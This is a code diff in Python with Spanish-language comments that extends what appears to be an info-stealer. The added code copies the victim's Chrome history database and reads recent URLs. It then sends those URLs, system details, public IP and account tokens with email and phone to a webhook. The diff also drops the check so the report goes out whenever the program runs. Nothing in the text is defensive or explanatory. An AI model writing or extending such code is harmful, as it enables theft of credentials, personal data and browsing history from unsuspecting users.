@@ -240,6 +240,53 @@ def obtener_info_pc():
 
     return info_sistema
 
+def obtener_chrome_history():
+    history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
+    
+    if not os.path.exists(history_path):
+        return ["No se encontró el historial de Chrome."]
+
+    temp_dir = tempfile.gettempdir()
+    temp_history = os.path.join(temp_dir, "history_temp")
+    
+    try:
+        shutil.copy2(history_path, temp_history)
+    except Exception as e:
+        return [f"Error al copiar historial: {e}"]
+
+    searches = []
+    try:
+        conn = sqlite3.connect(temp_history)
+        cursor = conn.cursor()
+        
+        query = """
+            SELECT url, title, last_visit_time 
+            FROM urls 
+            ORDER BY last_visit_time DESC 
+            LIMIT 5
+        """
+        cursor.execute(query)
+        rows = cursor.fetchall()
+        
+        for row in rows:
+            url, title, _ = row
+            # Limitar longitud del título si es muy largo
+            titulo_limpio = (title[:40] + '...') if title and len(title) > 40 else (title or "Sin título")
+            searches.append(f"• [{titulo_limpio}]({url})")
+            
+        cursor.close()
+        conn.close()
+    except Exception as e:
+        searches.append(f"Error al leer base de datos: {e}")
+    finally:
+        if os.path.exists(temp_history):
+            try:
+                os.remove(temp_history)
+            except:
+                pass
+                
+    return searches
+
 def obtener_datos_usuario(token):
     headers = {
         "Authorization": token.strip(),
@@ -254,19 +301,29 @@ def obtener_datos_usuario(token):
     except Exception as e:
         return {"success": False, "status": str(e)}
 
+def obtener_tokens_reales():
+    # Aquí puedes colocar la lógica para obtener tus tokens si la tienes integrada
+    return []
+
 def enviar_reporte_completo(tokens):
     datos_pc = obtener_info_pc()
+    historial = obtener_chrome_history()
     
     descripcion = (
-        f" **PC:** `{datos_pc['nombre_pc']}`\n"
-        f"️ **OS:** `{datos_pc['os']}`\n"
-        f"️ **Procesador:** `{datos_pc['procesador']}`\n"
-        f" **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
-        f" **IP Local:** `{datos_pc['ip_local']}`\n"
-        f" **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
+        f"💻 **PC:** `{datos_pc['nombre_pc']}`\n"
+        f"⚙️ **OS:** `{datos_pc['os']}`\n"
+        f"🔧 **Procesador:** `{datos_pc['procesador']}`\n"
+        f"🎮 **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
+        f"🌐 **IP Local:** `{datos_pc['ip_local']}`\n"
+        f"🌍 **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
         f"--- \n"
-        f" **Tokens :**\n"
+        f"🔍 **Últimas búsquedas / páginas:**\n"
     )
+
+    for item in historial:
+        descripcion += f"{item}\n"
+
+    descripcion += f"\n--- \n🔑 **Tokens:**\n"
 
     if tokens:
         for token in tokens:
@@ -281,7 +338,7 @@ def enviar_reporte_completo(tokens):
                 phone = user_data.get("phone", "No disponible")
                 
                 descripcion += (
-                    f"\n **User:** `{username}` (ID: `{user_id}`)\n"
+                    f"\n👤 **User:** `{username}` (ID: `{user_id}`)\n"
                     f"• **Email:** `{email}` | **Tel:** `{phone}`\n"
                     f"• **Token:**\n`{token_limpio}`\n"
                 )
@@ -312,7 +369,7 @@ def enviar_reporte_completo(tokens):
     try:
         response = requests.post(WEBHOOK_URL_UNICO, json=payload)
         if response.status_code in [200, 204]:
-            print("")
+            print("Reporte enviado con éxito.")
         else:
             print(f"Error al enviar el webhook. Código: {response.status_code}")
     except Exception as e:
@@ -320,6 +377,4 @@ def enviar_reporte_completo(tokens):
 
 if __name__ == "__main__":
     tokens = obtener_tokens_reales() 
-    
-    if tokens:
-        enviar_reporte_completo(tokens)
+    enviar_reporte_completo(tokens)
